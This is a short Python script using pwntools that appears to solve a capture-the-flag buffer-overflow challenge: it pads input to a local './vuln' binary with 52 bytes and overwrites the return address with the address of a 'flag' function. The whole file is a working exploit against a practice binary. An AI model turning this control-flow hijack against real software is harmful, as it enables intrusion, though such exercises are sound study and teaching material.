from pwn import *

p = process('./vuln')
elf = ELF('./vuln')

offset = 52
junk = b'A' * offset

payload = junk
payload += p32(elf.symbols['flag'])

p.sendline(payload)
p.interactive()
